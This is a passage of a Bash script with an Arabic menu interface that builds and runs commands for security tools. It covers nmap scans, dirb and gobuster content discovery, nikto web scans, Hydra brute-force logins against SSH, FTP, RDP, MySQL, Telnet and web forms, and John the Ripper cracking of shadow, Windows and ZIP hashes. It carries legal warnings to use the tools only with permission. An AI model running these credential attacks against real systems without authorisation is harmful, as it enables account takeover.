                CMD="nmap -T$TIMING $TARGET"
                execute_command "$CMD"
                ;;
            14)
                read_input "أدخل الشبكة (مثل: 192.168.1.0/24)" TARGET
                CMD="nmap -sn $TARGET"
                execute_command "$CMD"
                ;;
            15)
                read_input "أدخل IP/Hostname الهدف" TARGET
                CMD="nmap -sn $TARGET"
                execute_command "$CMD"
                ;;
            16)
                read_input "أدخل IP/Hostname الهدف" TARGET
                read_input "نوع الفحص (sS/sT/sU/sV/O/A)" SCAN_TYPE
                read_input "المنافذ (اتركه فارغ للافتراضي)" PORTS
                read_input "السرعة T0-T5 (اتركه فارغ للافتراضي)" TIMING
                read_input "NSE Scripts (مثل: vuln,auth)" SCRIPTS
                read_input "ملف الإخراج (اتركه فارغ لعدم الحفظ)" OUTPUT
                
                CMD="nmap"
                [ ! -z "$SCAN_TYPE" ] && CMD="$CMD -$SCAN_TYPE"
                [ ! -z "$PORTS" ] && CMD="$CMD -p $PORTS"
                [ ! -z "$TIMING" ] && CMD="$CMD -T$TIMING"
                [ ! -z "$SCRIPTS" ] && CMD="$CMD --script $SCRIPTS"
                [ ! -z "$OUTPUT" ] && CMD="$CMD -oA $OUTPUT"
                CMD="$CMD $TARGET"
                
                execute_command "$CMD"
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════
# DIRB - اكتشاف الملفات والمجلدات
# ═══════════════════════════════════════════════════════════
dirb_menu() {
    while true; do
        header
        echo -e "${BLUE}╔═══════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${WHITE}        DIRB - اكتشاف المحتوى          ${BLUE}║${NC}"
        echo -e "${BLUE}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} فحص أساسي"
        echo -e "${CYAN}[2]${NC} فحص مع قائمة كلمات مخصصة"
        echo -e "${CYAN}[3]${NC} فحص مع extensions محددة"
        echo -e "${CYAN}[4]${NC} فحص متقدم مع جميع الخيارات"
        echo -e "${CYAN}[5]${NC} فحص مع عدم اظلاف الأخطاء 404"
        echo -e "${CYAN}[6]${NC} فحص مع User-Agent مخصص"
        echo -e "${CYAN}[7]${NC} فحص مع Cookie"
        echo -e "${CYAN}[8]${NC} فحص متعدد المسارات"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                read_input "أدخل URL الهدف" TARGET
                CMD="dirb $TARGET"
                execute_command "$CMD"
                ;;
            2)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل مسار قائمة الكلمات" WORDLIST
                CMD="dirb $TARGET $WORDLIST"
                execute_command "$CMD"
                ;;
            3)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل extensions (مثل: .php,.html,.txt)" EXTENSIONS
                CMD="dirb $TARGET -X $EXTENSIONS"
                execute_command "$CMD"
                ;;
            4)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل قائمة الكلمات (اختياري)" WORDLIST
                read_input "أدخل extensions (اختياري)" EXTENSIONS
                read_input "أدخل معدل التخمين (1-10)" RATE
                
                CMD="dirb $TARGET"
                [[ ! -z "$WORDLIST" ]] && CMD="$CMD $WORDLIST"
                [[ ! -z "$EXTENSIONS" ]] && CMD="$CMD -X $EXTENSIONS"
                CMD="$CMD -z $RATE"
                
                execute_command "$CMD"
                ;;
            5)
                read_input "أدخل URL الهدف" TARGET
                CMD="dirb $TARGET -N 404"
                execute_command "$CMD"
                ;;
            6)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل User-Agent" USER_AGENT
                CMD="dirb $TARGET -a \"$USER_AGENT\""
                execute_command "$CMD"
                ;;
            7)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل Cookie" COOKIE
                CMD="dirb $TARGET -c \"$COOKIE\""
                execute_command "$CMD"
                ;;
            8)
                read_input "أدخل URL الأساسي" BASE_URL
                read_input "أدخل المسارات الإضافية (مثل: /admin,/api,/test)" PATHS
                CMD="echo \"$PATHS\" | tr ',' '\n' | xargs -I {} dirb \"$BASE_URL{}\""
                execute_command "$CMD"
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════
# HYDRA - كسر كلمات المرور
# ═══════════════════════════════════════════════════════════
hydra_menu() {
    while true; do
        header
        echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
        echo -e "${RED}║${WHITE}        HYDRA - كسر كلمات المرور        ${RED}║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} هجوم على SSH"
        echo -e "${CYAN}[2]${NC} هجوم على FTP"
        echo -e "${CYAN}[3]${NC} هجوم على HTTP/HTTPS"
        echo -e "${CYAN}[4]${NC} هجوم على MySQL"
        echo -e "${CYAN}[5]${NC} هجوم على RDP"
        echo -e "${CYAN}[6]${NC} هجوم على Telnet"
        echo -e "${CYAN}[7]${NC} هجوم مخصص"
        echo -e "${CYAN}[8]${NC} هجوم بقائمة مستخدمين"
        echo -e "${CYAN}[9]${NC} هجوم بقائمة كلمات مرور"
        echo -e "${CYAN}[10]${NC} هجوم متقدم"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                read_input "أدخل IP الهدف" TARGET
                read_input "أدخل اسم المستخدم" USERNAME
                read_input "أدخل مسار قائمة كلمات المرور" PASS_FILE
                CMD="hydra -l $USERNAME -P $PASS_FILE ssh://$TARGET"
                execute_command "$CMD"
                ;;
            2)
                read_input "أدخل IP الهدف" TARGET
                read_input "أدخل اسم المستخدم" USERNAME
                read_input "أدخل مسار قائمة كلمات المرور" PASS_FILE
                CMD="hydra -l $USERNAME -P $PASS_FILE ftp://$TARGET"
                execute_command "$CMD"
                ;;
            3)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل نوع النموذج (POST/GET)" METHOD
                read_input "أدخل حقل اسم المستخدم" USER_FIELD
                read_input "أدخل حقل كلمة المرور" PASS_FIELD
                read_input "أدخل رسالة الفشل" FAIL_MSG
                
                CMD="hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-$METHOD \"/login.php:$USER_FIELD=^USER^&$PASS_FIELD=^PASS^:$FAIL_MSG\""
                execute_command "$CMD"
                ;;
            4)
                read_input "أدخل IP الهدف" TARGET
                read_input "أدخل اسم المستخدم" USERNAME
                read_input "أدخل مسار قائمة كلمات المرور" PASS_FILE
                CMD="hydra -l $USERNAME -P $PASS_FILE mysql://$TARGET"
                execute_command "$CMD"
                ;;
            5)
                read_input "أدخل IP الهدف" TARGET
                read_input "أدخل اسم المستخدم" USERNAME
                read_input "أدخل مسار قائمة كلمات المرور" PASS_FILE
                CMD="hydra -l $USERNAME -P $PASS_FILE rdp://$TARGET"
                execute_command "$CMD"
                ;;
            6)
                read_input "أدخل IP الهدف" TARGET
                read_input "أدخل اسم المستخدم" USERNAME
                read_input "أدخل مسار قائمة كلمات المرور" PASS_FILE
                CMD="hydra -l $USERNAME -P $PASS_FILE telnet://$TARGET"
                execute_command "$CMD"
                ;;
            7)
                read_input "أدخل الهدف (IP أو URL)" TARGET
                read_input "أدخل الخدمة (ssh,ftp,http-post-form,etc)" SERVICE
                read_input "أدخل المعلمات الإضافية" PARAMS
                CMD="hydra $PARAMS $SERVICE://$TARGET"
                execute_command "$CMD"
                ;;
            8)
                read_input "أدخل IP الهدف" TARGET
                read_input "أدخل مسار قائمة المستخدمين" USER_FILE
                read_input "أدخل مسار قائمة كلمات المرور" PASS_FILE
                read_input "أدخل الخدمة" SERVICE
                CMD="hydra -L $USER_FILE -P $PASS_FILE $SERVICE://$TARGET"
                execute_command "$CMD"
                ;;
            9)
                read_input "أدخل IP الهدف" TARGET
                read_input "أدخل اسم المستخدم" USERNAME
                read_input "أدخل مسار قائمة كلمات المرور" PASS_FILE
                read_input "أدخل الخدمة" SERVICE
                read_input "أدخل المنفذ (اختياري)" PORT
                
                CMD="hydra -l $USERNAME -P $PASS_FILE"
                [[ ! -z "$PORT" ]] && CMD="$CMD -s $PORT"
                CMD="$CMD $SERVICE://$TARGET"
                
                execute_command "$CMD"
                ;;
            10)
                read_input "أدخل IP الهدف" TARGET
                read_input "أدخل الخدمة" SERVICE
                read_input "أدخل عدد المهام المتوازية" TASKS
                read_input "أدخل الوقت بين المحاولات (ثواني)" WAIT
                
                CMD="hydra -L users.txt -P passwords.txt -t $TASKS -w $WAIT -vV $SERVICE://$TARGET"
                execute_command "$CMD"
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════
# القائمة الرئيسية المحسنة
# ═══════════════════════════════════════════════════════════
main_menu() {
    while true; do
        header
        echo -e "${WHITE}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${WHITE}║${GREEN}                    القائمة الرئيسية                       ${WHITE}║${NC}"
        echo -e "${WHITE}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${RED}  [1] SQLMap    ${NC}- فحص ثغرات SQL Injection"
        echo -e "${BLUE}  [2] Amass     ${NC}- استكشاف النطاقات الفرعية"
        echo -e "${GREEN}  [3] Netcat    ${NC}- أداة الشبكات متعددة الاستخدامات"
        echo -e "${PURPLE}  [4] Nmap      ${NC}- فحص المنافذ والشبكات"
        echo -e "${YELLOW}  [5] Metasploit${NC}- إطار العمل الشامل للاستغلال"
        echo -e "${CYAN}  [6] Dirb      ${NC}- اكتشاف الملفات والمجلدات"
        echo -e "${RED}  [7] Hydra     ${NC}- كسر كلمات المرور"
        echo -e "${PURPLE}  [8] Gobuster  ${NC}- اكتشاف المحتوى والنطاقات"
        echo -e "${YELLOW}  [9] Nikto     ${NC}- فحص خواد الويب"
        echo -e "${BLUE}  [10] John     ${NC}- كسر كلمات المرور"
        echo ""
        echo -e "${YELLOW}  [11] تحقق من تثبيت الأدوات${NC}"
        echo -e "${CYAN}  [12] معلومات وتعليمات${NC}"
        echo -e "${GREEN}  [13] إعدادات متقدمة${NC}"
        echo -e "${RED}  [0] خروج${NC}"
        echo ""
        echo -ne "${GREEN}اختر رقم الأداة: ${NC}"
        read choice
        
        case $choice in
            1) sqlmap_menu ;;
            2) amass_menu ;;
            3) netcat_menu ;;
            4) nmap_menu ;;
            5) metasploit_menu ;;
            6) dirb_menu ;;
            7) hydra_menu ;;
            8) gobuster_menu ;;
            9) nikto_menu ;;
            10) john_menu ;;
            11) check_tools ;;
            12) show_help ;;
            13) advanced_settings ;;
            0) 
                echo -e "${CYAN}شكراً لاستخدام الأداة!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════
# دوال الأدوات المتبقية
# ═══════════════════════════════════════════════════════════

# GOBUSTER - اكتشاف الملفات والنطاقات
gobuster_menu() {
    while true; do
        header
        echo -e "${PURPLE}╔═══════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║${WHITE}       GOBUSTER - اكتشاف المحتوى        ${PURPLE}║${NC}"
        echo -e "${PURPLE}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} اكتشاف المجلدات (dir)"
        echo -e "${CYAN}[2]${NC} اكتشاف النطاقات الفرعية (dns)"
        echo -e "${CYAN}[3]${NC} اكتشاف مع extensions"
        echo -e "${CYAN}[4]${NC} اكتشاف متقدم"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل مسار قائمة الكلمات" WORDLIST
                CMD="gobuster dir -u $TARGET -w $WORDLIST"
                execute_command "$CMD"
                ;;
            2)
                read_input "أدخل النطاق الهدف" DOMAIN
                read_input "أدخل مسار قائمة الكلمات" WORDLIST
                CMD="gobuster dns -d $DOMAIN -w $WORDLIST"
                execute_command "$CMD"
                ;;
            3)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل مسار قائمة الكلمات" WORDLIST
                read_input "أدخل extensions (مثل: php,html,txt)" EXTENSIONS
                CMD="gobuster dir -u $TARGET -w $WORDLIST -x $EXTENSIONS"
                execute_command "$CMD"
                ;;
            4)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل مسار قائمة الكلمات" WORDLIST
                read_input "أدخل عدد threads" THREADS
                CMD="gobuster dir -u $TARGET -w $WORDLIST -t $THREADS -q"
                execute_command "$CMD"
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# NIKTO - فحص خواد الويب
nikto_menu() {
    while true; do
        header
        echo -e "${YELLOW}╔═══════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║${WHITE}         NIKTO - فحص خواد الويب         ${YELLOW}║${NC}"
        echo -e "${YELLOW}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} فحص أساسي"
        echo -e "${CYAN}[2]${NC} فحص مع منفذ مخصص"
        echo -e "${CYAN}[3]${NC} فحص مع SSL/TLS"
        echo -e "${CYAN}[4]${NC} فحص متقدم"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                read_input "أدخل URL الهدف" TARGET
                CMD="nikto -h $TARGET"
                execute_command "$CMD"
                ;;
            2)
                read_input "أدخل URL الهدف" TARGET
                read_input "أدخل المنفذ" PORT
                CMD="nikto -h $TARGET -p $PORT"
                execute_command "$CMD"
                ;;
            3)
                read_input "أدخل URL الهدف" TARGET
                CMD="nikto -h $TARGET -ssl"
                execute_command "$CMD"
                ;;
            4)
                read_input "أدخل URL الهدف" TARGET
                CMD="nikto -h $TARGET -Display V -Format htm -o nikto_report.html"
                execute_command "$CMD"
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# JOHN THE RIPPER - كسر كلمات المرور
john_menu() {
    while true; do
        header
        echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
        echo -e "${RED}║${WHITE}      JOHN THE RIPPER - كسر كلمات المرور   ${RED}║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} كسر كلمات مرور Linux (shadow)"
        echo -e "${CYAN}[2]${NC} كسر كلمات مرور Windows"
        echo -e "${CYAN}[3]${NC} كسر كلمات مرور ZIP"
        echo -e "${CYAN}[4]${NC} كسر باستخدام قائمة كلمات"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                read_input "أدخل مسار ملف shadow" SHADOW_FILE
                read_input "أدخل مسار ملف passwd" PASSWD_FILE
                CMD="unshadow $PASSWD_FILE $SHADOW_FILE > hashes.txt && john hashes.txt"
                execute_command "$CMD"
                ;;
            2)
                read_input "أدخل مسار ملف hashes الخاص بـ Windows" HASH_FILE
                CMD="john --format=nt $HASH_FILE"
                execute_command "$CMD"
                ;;
            3)
                read_input "أدخل مسار ملف ZIP" ZIP_FILE
                CMD="zip2john $ZIP_FILE > zip_hash.txt && john zip_hash.txt"
                execute_command "$CMD"
                ;;
            4)
                read_input "أدخل مسار ملف Hashes" HASH_FILE
                read_input "أدخل مسار قائمة كلمات المرور" WORDLIST
                CMD="john --wordlist=$WORDLIST $HASH_FILE"
                execute_command "$CMD"
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════
# دوال التحقق والمساعدة
# ═══════════════════════════════════════════════════════════

# دالة التحقق من تثبيت الأدوات
check_tools() {
    header
    echo -e "${YELLOW}╔═══════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║${WHITE}      التحقق من تثبيت الأدوات         ${YELLOW}║${NC}"
    echo -e "${YELLOW}╚═══════════════════════════════════════╝${NC}"
    echo ""
    
    local tools=(
        "sqlmap" "amass" "nc" "nmap" "msfconsole" "msfvenom" 
        "dirb" "hydra" "gobuster" "nikto" "john"
    )
    
    local descriptions=(
        "فحص ثغرات SQL Injection"
        "استكشاف النطاقات الفرعية"
        "أداة الشبكات متعددة الاستخدامات"
        "فحص المنافذ والشبكات"
        "إطار العمل الشامل للاستغلال"
        "إنشاء Payloads"
        "اكتشاف الملفات والمجلدات"
        "كسر كلمات المرور"
        "اكتشاف المحتوى والنطاقات"
        "فحص خواد الويب"
        "كسر كلمات المرور"
    )
    
    for i in "${!tools[@]}"; do
        tool="${tools[$i]}"
        desc="${descriptions[$i]}"
        
        echo -ne "${WHITE}$tool${NC} - $desc: "
        check_installed "$tool"
    done
    
    echo ""
    echo -e "${PURPLE}اضغط Enter للعودة...${NC}"
    read
}

# دالة عرض المساعدة
show_help() {
    header
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${WHITE}                 معلومات وتعليمات الاستخدام                ${CYAN}║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${YELLOW}═══ الأدوات المتاحة ═══${NC}"
    echo -e "${GREEN}• SQLMap${NC} - فحص واستغلال ثغرات SQL Injection"
    echo -e "${GREEN}• Amass${NC} - استكشاف النطاقات الفرعية وجمع المعلومات"
    echo -e "${GREEN}• Netcat${NC} - أداة الشبكات متعددة الاستخدامات"
    echo -e "${GREEN}• Nmap${NC} - فحص الشبكات والمنافذ والخدمات"
    echo -e "${GREEN}• Metasploit${NC} - إطار عمل شامل للاستغلال"
    echo -e "${GREEN}• Dirb${NC} - اكتشاف الملفات والمجلدات المخفية"
    echo -e "${GREEN}• Hydra${NC} - كسر كلمات المرور بأنواع مختلفة"
    echo -e "${GREEN}• Gobuster${NC} - اكتشاف المحتوى والنطاقات بسرعة"
    echo -e "${GREEN}• Nikto${NC} - فحص خواد الويب والثغرات الشائعة"
    echo -e "${GREEN}• John The Ripper${NC} - كسر كلمات المرور الم hash"
    echo ""
    
    echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║${WHITE}                      ⚠️ تحذيرات قانونية ⚠️                  ${RED}║${NC}"
    echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo -e "${YELLOW}• استخدم هذه الأدوات فقط على أنظمة لديك إذن باختبارها${NC}"
    echo -e "${YELLOW}• الاستخدام غير المصرح به يعتبر جريمة إلكترونية${NC}"
    echo -e "${YELLOW}• احصل دائماً على إذن كتابي قبل اختبار أي نظام${NC}"
    echo ""
    
    echo -e "${PURPLE}اضغط Enter للعودة للقائمة الرئيسية...${NC}"
    read
}

# الإعدادات المتقدمة
advanced_settings() {
    while true; do
        header
        echo -e "${PURPLE}╔═══════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║${WHITE}            الإعدادات المتقدمة              ${PURPLE}║${NC}"
        echo -e "${PURPLE}╚═══════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[1]${NC} تحديث النظام"
        echo -e "${CYAN}[2]${NC} تثبيت أدوات مفقودة"
        echo -e "${CYAN}[3]${NC} إعداد Proxy"
        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
        echo ""
        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
        read choice
        
        case $choice in
            1)
                CMD="sudo apt update && sudo apt upgrade -y"
                execute_command "$CMD" "true"
                ;;
            2)
                install_missing_tools
                ;;
            3)
                read_input "أدخل عنوان Proxy (مثل: http://proxy:8080)" PROXY
                export http_proxy=$PROXY
                export https_proxy=$PROXY
                echo -e "${GREEN}تم تعيين Proxy: $PROXY${NC}"
                sleep 2
                ;;
            0)
                return
                ;;
            *)
                echo -e "${RED}خيار غير صحيح!${NC}"
                sleep 1
                ;;
        esac
    done
}

# دالة تثبيت الأدوات المفقودة
install_missing_tools() {
    header
    echo -e "${YELLOW}╔═══════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║${WHITE}         تثبيت الأدوات المفقودة           ${YELLOW}║${NC}"
    echo -e "${YELLOW}╚═══════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${CYAN}جارٍ تثبيت الأدوات المفقودة...${NC}"
    
    # تثبيت sqlmap
    if ! command -v sqlmap &> /dev/null; then
        echo -e "${YELLOW}تثبيت SQLMap...${NC}"
        git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /opt/sqlmap
        sudo ln -sf /opt/sqlmap/sqlmap.py /usr/local/bin/sqlmap
    fi
    
    # تثبيت أدوات أخرى
    tools_to_install=("amass" "nmap" "dirb" "hydra" "gobuster" "nikto" "john")
    for tool in "${tools_to_install[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${YELLOW}تثبيت $tool...${NC}"
            sudo apt install -y $tool
        fi
    done
    
    # تثبيت netcat
    if ! command -v nc &> /dev/null; then
        sudo apt install -y netcat
    fi
    
    echo -e "${GREEN}✓ تم الانتهاء من التثبيت${NC}"
    echo -e "${PURPLE}اضغط Enter للمتابعة...${NC}"
    read
}

# ═══════════════════════════════════════════════════════════
# بدء البرنامج
# ═══════════════════════════════════════════════════════════

# التحقق من وجود الأدوات الأساسية
check_basic_tools() {
    local basic_tools=("bash" "curl" "wget" "git")
    for tool in "${basic_tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${RED}✗ $tool غير مثبت - يرجى تثبيته أولاً${NC}"
            exit 1
        fi
    done
}

# العرض الافتتاحي
show_welcome() {
    header
    echo -e "${GREEN}مرحباً بك في مجموعة أدوات الاختبار الأمني المتكاملة${NC}"
    echo -e "${CYAN}هذا السكريبت يوفر واجهة سهلة لاستخدام أدوات الاختراق الأخلاقي${NC}"
    echo ""
    echo -e "${YELLOW}المميزات:${NC}"
    echo -e "${WHITE}• واجهة عربية سهلة الاستخدام${NC}"
    echo -e "${WHITE}• أكثر من 10 أدوات أمنية متكاملة${NC}"
    echo -e "${WHITE}• أوامر مسبقة الإعداد${NC}"
    echo -e "${WHITE}• تحقق تلقائي من التثبيت${NC}"
    echo ""
    echo -e "${YELLOW}⚠️  استخدم هذه الأدوات بشكل قانوني وأخلاقي فقط${NC}"
    echo ""
    echo -e "${PURPLE}اضغط Enter للبدء...${NC}"
    read
}

# الدالة الرئيسية للبدء
main() {
    # التحقق من الأدوات الأساسية
    check_basic_tools
    
    # عرض الترحيب
    show_welcome
    
    # تشغيل القائمة الرئيسية
    main_menu
}

# بدء البرنامج
main
